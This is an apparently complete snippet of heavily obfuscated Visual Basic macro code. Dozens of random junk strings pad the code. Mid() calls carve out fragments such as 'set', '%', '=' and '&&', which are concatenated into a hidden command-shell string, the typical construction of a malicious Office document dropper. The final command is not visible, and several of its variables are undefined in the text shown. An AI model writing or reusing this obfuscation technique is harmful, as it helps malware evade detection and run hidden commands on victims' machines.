YXoap = ("aGriuRVvzwXivD" + "fFpEcaIrjB" + "HdATqnEFqzlWB" + "XmWkiWLl" + "akTJiXSOKdBKrv" + "FjdqNYtjowE") + ("lHCihWiZiXdWh" + "jatAzjrrfu" + "UYajAiMikjHIw" + "nMWwiFHJp" + "SqozXwubHmNwE" + "hsRrzrbSujJUV")
jhWAmJzDz = ("XwpMbUrjGB" + "FnrkITiXWCRWs" + "AiKGzPvtR" + "jMnYrkkWMqwH" + "zZBTYhX" + "ZwtbpjZ") + ("msMVKBwf" + "fmRvKCWs" + "NhvvXLtbJPu" + "CDLNZzklpvcWJs" + "GKPtWiKSrOqVAb" + "sjkMdiGikEmH")
fSuWzaOHFbC = ("wolLikNKqMGnmf" + "LGpIdOq" + "PMwNAvIqDbAiT" + "BPTiXBE" + "JFvSiaUMrfGA" + "zkWNOiWCLl") + ("hKEZowr" + "jiCtShNhWrkUY" + "fCiwQJTii" + "TulYVuXsoSQrzr" + "fBAALbQ" + "OfCusihVBvE")
hGczzqOf = Mid("w4G23z1A1HqOqUYoqAGmTZKwqptjAP&set %rZDzaLddnU", 31, 11)
acwQHn = ("SEYmiPnQtWYOr" + "TzjcjJGDwmwP" + "zcfpkbWAn" + "ErlnSwKMwmzmi" + "cCziPIl" + "PCooNjnnUkjJi") + ("wVnEmawcPMti" + "hdoliDPc" + "zildYKRMGZWr" + "cuLWLqm" + "bvjTGKjzBFPI" + "VITICoKCG")
YRShjj = ("VLupMkopz" + "HBaSqJEXAX" + "jtiXDzOG" + "viPwGjRYAJw" + "frVsEPwiSHjL" + "oSMSJlZj") + ("bYlcLGrfWq" + "XBBNiwkRXIo" + "EpRREGrYWAJPwH" + "DqqmktklnQz" + "KBIMMnahnupmZ" + "SEXrlQXXhbj")
zoFShhL = ("IVcAtaIsYp" + "YjBJRAlNETGjoG" + "rNJCcjVbawdJ" + "YtNrSTzZRzkoZ" + "BABlnuHiviWNM" + "IbLoqwp") + ("GPQVIMaO" + "NDuUbZMpPf" + "ziUFHvRqowwaA" + "tlUSlvHhJIKRi" + "BwwaSwObvLON" + "kZcPcufhnrXiki")
tRaWV = Mid("oo5uijm241w3PnZza5Oi        k8jM", 21, 8)
VJEGjKDT = ("DFTEiBFSjX" + "owcVZoIBE" + "FajNviiQn" + "hfqjVOiQnh" + "wvpjuIv" + "iYacIwimqiXXCt") + ("hIFtAKG" + "NWHHfqiBVnSEv" + "DikqbriQ" + "EFsIapPu" + "cfMFBrzwMhBkj" + "HaFXJKjOKwMCB")
zVSjpbDSNb = ("DwwJQfaORhTC" + "VDOFGkrBRMHFrK" + "hRYpFffJAL" + "fQMQBcv" + "fPpqzoHlll" + "DYUEjAJiwRquO") + ("CFapBKiKXfHsbY" + "zutXIHi" + "MfPrzwDo" + "avzjjvjaMt" + "owoZkdz" + "wXFmXuOJlT")
uNsITnluwIW = ("iDLGsfbQtzjt" + "ffBOaUQlhVRFk" + "OVQtwpM" + "IVvrENqjI" + "PTDjJhmilBAiu" + "IbNvdEh") + ("iRWfTiP" + "uBNaqQA" + "LiGQDLNaauj" + "AvCDJLplNdO" + "SiHwUUK" + "bijvzRASDvFYz")
MuiFQsS = Mid("BYo%!!%KOM6I5a1jYm5LwmZAcpjpKj6aHsiYu", 4, 4)
VOCDtYqEC = ("LTqnSfbRQwKw" + "OdVQrqGUzjswUJ" + "pSmzHfihwJ" + "tJMiYmbJYu" + "zSvMNLnzqz" + "CczMMoQfvX") + ("VwzIQIGV" + "kfQUUCuS" + "uASYXHjlLZ" + "sszArwwPEvfr" + "mlWLcrKtwJ" + "XozZqYf")
iGrpdSlk = ("kjhimlKGkSF" + "iKNdoZC" + "XcoLaPXfwCj" + "ozVhlczjZzvFw" + "cpVLBhIzFHv" + "DXOfHhlPOj") + ("jrLaSEXjjNwmh" + "mAzhprNm" + "YcVurOTiN" + "ApUqHpviaMHFkj" + "VjmiZobubm" + "zKjSPfkqhVSKss")
ZaPMHEK = ("jjSsjQdYDfNbPJ" + "llkYITPsujwdDw" + "YjPiKlUtqv" + "TGNlhlOqMnFzXc" + "qXIimaZiH" + "LjwMQsudIzIi") + ("BMPMllSj" + "FtvwkIIYucGFW" + "PiwvLWO" + "ILPGWXNnsoz" + "aFQTHlUkF" + "XDfHzipqHKi")
zZkqqLjM = Mid("Ji1G4AQPzPpd5tsYpEf7ANpfY", 10, 1)
UNwPQb = ("JnZITspZWhjAoG" + "vsDJrlBIwc" + "twACWtqffo" + "TTFIkKkjiv" + "IZZHiAIHidfw" + "qZTLnKIblaZkEj") + ("rXNzZKq" + "dOKpXXJqnUG" + "LqZvUnIWz" + "WiQHQHQ" + "ZnzwqwcUlEbk" + "PzQoBwRcmCTb")
vIVLEHGJV = ("AoYDzwD" + "QTvAUaZ" + "JGDcJZs" + "rAoOjhYvdBdRCT" + "zdYXljjk" + "PRqUzPubwZM") + ("IpVjuAWTwHDpzG" + "lBGTLQLzSrEvOH" + "VcHMpoC" + "rjJQfHNAWtQIZ" + "GBjzpDsqEIMum" + "ilRKiNPnBzf")
DikBrRIXo = ("sjYPHCaFvST" + "AcTABDvP" + "GjATPIwFn" + "fXNEvvWwZJjU" + "zcAWwckwYMO" + "AYwstbzIhnpn") + ("XEfHVFhmBC" + "OmAcCnGLwSvXa" + "jhhMzJn" + "zbYFqDGhz" + "WFiGbXFthdoFch" + "CoXAaDs")
QaLutZ = Mid("quS1qGYupYYpV %siRVON69t3DdEoiAhLcuzuw", 14, 7)
QluKbwK = ("EqiCzwcfWGfsw" + "wBbAElVmSlcGaM" + "TzjRwwBIBKN" + "GEbFZLiRO" + "AvuWSYwa" + "YQFCGwaAButaq") + ("TOhqfDurvMIwl" + "bfdLbTpBAC" + "GwKhWUkKEa" + "khRXwjVt" + "HNCZVQhwWAROfV" + "EkKYrXojwT")
zjpsDNYaA = ("isqtsjnIwSKiqM" + "IoBOptiCD" + "OLUWRIdt" + "zGQjtLCnv" + "BNDisiQqLPC" + "pniiYSmiJjoYMH") + ("IICnGnaBzLjcr" + "SSiPzRd" + "OmjBRSUYfRknIi" + "cwMOlkSs" + "virOKIMqOKtPD" + "WIhYjPr")
XFWWl = ("vuEWJjHINtvlLF" + "mnEJtEMsSMWwB" + "TjGFaUnuzr" + "GXIfIwwSElAc" + "aqjClKmkFmtNp" + "lkzrnMZmhEN") + ("NYdzkSDT" + "jllJpFzAlOR" + "SMhEuMQNn" + "foazOGIB" + "JWACzOiwHZl" + "pvruLvtqGnFrZF")
mIrScU = Mid("kPrzjwzset NQQ7wOM01tZq1LnXwzhFA9Lqzl", 8, 4)
uHruhN = ("rjJBSnC" + "MwutFmaFOWFuY" + "osZrqGEMmcwrmH" + "IqZoWzz" + "JzjicKKKzf" + "vQcbzvnAJRvOAS") + ("FjfGCAr" + "PrHYcBcSBM" + "MojOcsjwnCOki" + "bEiircsEs" + "kpXLwhztC" + "FLZRDNTD")
tkjznHc = ("VHamMvjYci" + "tojqslpGjUma" + "puCvwCaNqJ" + "cQatBiDaj" + "DNGwSnIbkAjhB" + "StkZaIYCfQNbLv") + ("FRMrkmj" + "zjORlGIjvPdbIt" + "AaQAipjqcMW" + "jWqRKlzltLq" + "wXkSMiTwLmLQ" + "mzGQpmFOaY")
bcvVG = ("VAGYIAz" + "oKjzIvTimUXzGD" + "haKQfMadJo" + "XMdRPKB" + "KjTHzQFnRtvG" + "RfZzzkRlOjZKHX") + ("AVENvWtk" + "SMzZZIjOi" + "GjETRak" + "vDuzqszmwoiKaX" + "KilkrMGwKcDRaw" + "mmLYzhU")
ocvohk = Mid("h6bsSH       U44bVi5ORO", 7, 7)
HloEAjma = ("FzSqLHlo" + "dDLEQiusaTwK" + "zYnrVEZkYV" + "aNPPdlEBXfrimB" + "LsMnHbwfAtCTmh" + "zEhMdDOiO") + ("OvntGpBpWtjXk" + "XchPVbRSU" + "fmBaXvwO" + "wsjLltEBiQojcU" + "oBVzInYwa" + "OUoaSawSZmV")
iMkcrAp = ("IFWzwkmnJwAwN" + "uuEJVaw" + "YhuGSnITFbIdqw" + "QNtzOacjfECiJ" + "dQdvKhpCrRzfpq" + "pjOwDovcai") + ("vzPCQIwUcL" + "ijQCOVbzikm" + "pVohGLin" + "MmlrmpB" + "jVOOKAhjAaZAb" + "nJnZhcasItXcWu")
PFszlf = ("QwVRanBjYDRil" + "awFKZvFfXZ" + "aLqrQCizw" + "ZirNlutGKCGo" + "zAMOMZmlZvBzbL" + "IBjkokBSOzoAL") + ("MXJmPqqEnV" + "KzzipNKiEw" + "SWzLwiwR" + "YaMMYsNMVz" + "ONMdlBk" + "jdRHZEEnmD")
CZZrkJzwu = Mid("Q8iqLD4qnVsHCrfr%=Fmz4zv3lPE3", 10, 9)
WEXXOn = ("KbjaICOYwfU" + "BFkImbM" + "cENIYQnNUqhinA" + "wtaSwYlruMVYn" + "lkBJvDGOXB" + "PBDFzpTBPmPMI") + ("aqMSvDsAp" + "GjVrzikVZahX" + "mzXCXXlVYstV" + "uvcwzOMU" + "RTbEjBtnihCJaV" + "AVdDNhnbWk")
MOPVQp = ("IaMkVFdrwa" + "RjXlqPX" + "ijDoHYddmuYUZ" + "dcszoCL" + "zQMNzPEh" + "vVTOpElFMrcr") + ("aGfNGvtqaUjXkm" + "uaOYELdzFpn" + "GucKjTBqGh" + "JJosUAmqFRJK" + "dDnmwGZXSXmv" + "JzDiwWMpFPPSIz")
BdWGtMBw = ("otaaTLNnjDaSq" + "clKLSDUaEzil" + "GRdrFTsM" + "MHOrvnp" + "ZCmTlwdQDh" + "OpdwhCGVCL") + ("zzXbYCwbHj" + "kXcwpVUzbCmY" + "KjLhopRmHECowJ" + "aTbZncFFTi" + "kACkSMZYR" + "rPmRPwcTZKsLw")
qzfDkUMQ = Mid("LqNIo9NDkWnrS7jOwwDo%!!%EqdmR4i5B5AtJ1pnqIN7ad", 16, 9)
QRIdvGtkjfv = ("wiGwkqhfjP" + "zIMqlBzWqomXVn" + "vYoXUnHGYkQpLH" + "SXSBWEdOdOU" + "IiMLlJmuJqIv" + "sCnGVLm") + ("OWPETQtSJ" + "JzBzbMYf" + "ZMTbPXviCpH" + "CiWuIwHR" + "sbzfwwEtabhpfN" + "uuzjXlr")
EdikJ = ("iNnYTiCLzDoX" + "AwjHCMm" + "DrHbCGr" + "LqjAjKu" + "iNIDKFTFf" + "ZUdvLDY") + ("fVjzQbKKoNH" + "SpDPZpDjtz" + "BvChXWQfcb" + "fYkkwhs" + "RGwIikQOVVApnh" + "fCOtnnXiivPJfi")
AXZHHAmfoh = ("CCHQiESPRNm" + "lTvQbrlbOZS" + "VUzNwauHBw" + "drjZoILQctjRbz" + "FjAQPcjluKFF" + "qTifmWSYv") + ("wTDJqcpDY" + "NVNHljUtG" + "OjCsZIPBiEjK" + "ODwLTtIF" + "jqFVFXuD" + "ZSJCNQL")
MoFSSc = Mid("joO1XpwQDjOb4NKDH7iBAE6aUz2c8ERd", 9, 3)
mzwLLsimIEE = ("sWqtfSDnUzGIv" + "clPwaFih" + "ELtXTMSaljfdd" + "tCfcOuvhfcZBJz" + "EZHLimil" + "jaBWUYPjznWvvd") + ("nsXjQwSDT" + "hKYRvMKQk" + "osYMGNtCWcPIv" + "XqOCUwRWhHnNq" + "DaLfLkiuT" + "ZDEPjqzY")
HkzXsYvD = ("darJWDTp" + "dkvzfAE" + "NwrONcCnaGjc" + "UGfVunlaVa" + "hwnoDqcjjF" + "wdwPwpWwwmMl") + ("iPbkNSLs" + "UhQpOjjiwt" + "nICYipwEZ" + "kULiJoPsWQt" + "ZIPzJamMSqTWV" + "NDFXWHStjM")
XFbLAvQi = ("luFwIvnbR" + "RZsXfwwR" + "zLIcWDcRrBpr" + "OwFUwbCj" + "IMjCljjZRk" + "PbDcRiujdv") + ("bTJKuRKAUOA" + "DvtUSwlSkF" + "smvdDPjWG" + "ilPtamOORQL" + "CAjXOcksd" + "WCQYwoHknruwU")
PiWhsTZbD = Mid("dBset iLKu1DtD1IF8ZlpFK4whnBO", 3, 4)
SdIVWzQGIJ = ("KEvUlZc" + "zitJfjVSML" + "BoInaLmwumVfYC" + "wWqrjQrAWnUtar" + "oFipLQC" + "VIwbijdCU") + ("khwbVfiJ" + "mzGSLHszPzjrd" + "GVihpIRslzmpKC" + "kCLBcPQO" + "mUpmNElPHlsGm" + "pBWuOHfWwpkfvY")
PJSrI = ("pifDCmO" + "tTuwwXjJOh" + "zQlYXQGYCzwt" + "hToIWSbUCMj" + "ECHXYiwjrsoD" + "HnwNLYv") + ("SPfjYnvFQw" + "CqTNzAi" + "zJkpfkCOf" + "GqnnHlncnAv" + "iavjAPo" + "wNhIvPiZAwW")
SMDovfvbiSo = ("AhpGruUTfihOX" + "YKGwFVAGUCHL" + "XzBiJMaGE" + "AuCUhqP" + "sHnYfihpCpu" + "nzjizTdw") + ("BzcUHFDCBS" + "FWODdwUXB" + "KkLsQAOYW" + "NTHqKKEYY" + "mBWiGQkcAzw" + "vFrMRcr")
ljFAvdzfPl = Mid("EGj2wwW9wazp9Y6MqstWUvAhs1jz", 20, 3)
niEjiRCX = ("QZJFRPihaX" + "iVwfKtvkm" + "FitJfssDNc" + "dWmEQqSljHAZz" + "nwkXjEO" + "zKrPvmWqiMuY") + ("wKatDdw" + "SFIuGst" + "fhXauXbN" + "ujOqcnf" + "CooJidbQdjF" + "VpudjzfXwGai")
FNIJqaob = ("sOrupku" + "adSuPHofCzRzB" + "LaoTwvWHOrMaOW" + "VuDmnOXjRpiAp" + "ziZCzDQFWlzTTP" + "ipsRmhCOKNj") + ("rXdUvjJPMnYRT" + "PYRnUvIIjAl" + "CQwQOoRPYisR" + "mJAOvQb" + "KRdwXtlfiodiMi" + "SwYkzDDjfAjhl")
QEznFww = ("sJzkPpRdS" + "DFzAEwJ" + "rWffFllGd" + "HcwNGwmT" + "jOqoEDkqXlw" + "aoqjMhNELwI") + ("JVpIpzAO" + "SdCAiabUvNVf" + "hoGduOZPShFi" + "iNcAYkkrHKn" + "iHlkPknhdoBB" + "FmoUAwwW")
UYhDUW = Mid("muhsntwQD1FjLkus1KoLzpdzwwDo%=p&&TiJ", 25, 9)
WrduM = ("unjKjszT" + "rujkquPjr" + "QhRWjcvG" + "wwnMzWnAuXcl" + "zdhpTTMmQQsZUa" + "RCiolOVWDij") + ("CtULOWXio" + "rIbtzhjvmiwKj" + "pnzfiGdHmGKsw" + "dCzsobL" + "NsQnqHvBQs" + "bVbWrEhL")
inTbXWIGiF = PiWhsTZbD + bDjpMHs + blZViDZn + UAuzRH + UUbMU + izoaiMKtY + vMEEwljYaTa + REXpmsFJ + aYWzM + hGczzqOf + aOquXVZXL + rJYLqwQWj + QaLutZ + UYhDUW + mIrScU + OQXroWcrXn + TOPUwU + ljFAvdzfPl + zZkqqLjM + CZZrkJzwu + CpkkHLwMtGS + sjXpmw + cksWAmZMvVX + HmIUOINY + qjYpalvd + YvRzYOF + fwqdHG + FwqGolNNm + MoFSSc + QnRqzW + ivaQcCJXwiQ + MDpcBNhAC + qzfDkUMQ + osAWqODjkd + MuiFQsS + EZDvjQPJ + lilXJOfruo + ocvohk + tRaWV + GzzDjnJDlij
jWVjFlaSj = ("EVHhQaHOqQWM" + "pRhUjCjFnHQb" + "rILCPpL" + "MWDuFAOdNQ" + "XmjRXQrPDbQOr" + "NizDoBh") + ("PcviZdB" + "cZqbDQLqo" + "XZHtvILosRPZ" + "OHXWDWsrNN" + "wqXQCwXIOCiH" + "WhnTklkBCAbTj")
uHUvuJLVu = ("kvmvuHL" + "kAiAWjZGcd" + "vqwzVCPoTIUv" + "bcCXwppurd" + "SCulkWnhikzOo" + "RtiTrOQEGYujBI") + ("nqENFiSHiDwU" + "NncNOZjwLbzO" + "OvVrEUfvutv" + "iTwlAPv" + "iqTwjRcbqcPEwf" + "WmmzcoqTu")
hMfFhKKLE = ("vXcYLmsEFS" + "qCDCbzNQSGn" + "ZPTmWtfREz" + "jtuNbNkjlBQ" + "KcCGLzvlNHzDJ" + "zVLZAZrXUJhlm") + ("iWCWIZI" + "TnUUINRb" + "qEjNOYLAqwnHt" + "ZKsDrFduji" + "CXFjRiFsQqhCp" + "zrVSbVCaOu")
JPKZWPwUB = ("MAFUZUhOch" + "HDiuNIbINnbIK" + "BTjWBuMBRI" + "lBtGnnzhCBLbfI" + "UMnjkrvz" + "ABsbmjGmaz") + ("HiBZAdbIUps" + "OuazNhX" + "qDVGmvW" + "WvZBijzlKNjGQn" + "iIAihMjsECs" + "ENvnFHjlYPqS")
huopzwRoD = ("nwlRphpCVz" + "uvYPaiwjBESRh" + "mYqsFkDiiZwCoS" + "wVtrcmzPaZUSEC" + "VhDUDJwKPO" + "MQwSYqjkFiYZ") + ("JmIQTlS" + "jJEPwTPpzLdcqa" + "RIBilTzmwHwL" + "AiriwnjHt" + "ZWRvHWu" + "OjDrIRHjfiWHIz")
IwoOUzjDt = ("XFbHUYpQCKk" + "MJaZWPIzklu" + "OSGtCuQKqcU" + "pAMGtGF" + "OjmfoucQvvqlLB" + "BRvNHtZljoXkW") + ("BDijvLi" + "bFHRAPuliro" + "KpwszEpu" + "qQKGMur" + "EPqKVqqG" + "tKrzGjvPtMFli")
rWodkozLn = ("DZibzzowHm" + "LfCEkkOr" + "ilaWYUVsF" + "JiFooYb" + "zRENwwa" + "qlYzEiUUnRz") + ("DdbwsFdd" + "qOjIfQZ" + "UmbvsdkUF" + "aKlBWZUBUqIUtV" + "ZAWrrYRuFSiXMK" + "qcmHDTU")
prHoiwiGA = ("GwTdNcOZJPfis" + "HqTzfhm" + "dEKfkCtVM" + "SlQNqXdzYhtEpH" + "FjncjaSHoUOSis" + "foDjQHlt") + ("wWfJEYZPDffWGs" + "XzibtbEvHMC" + "AIrsTmn" + "NvJCQuzPCMpZ" + "aIQdKAXraYwCSY" + "LnLjSLPc")
End Function
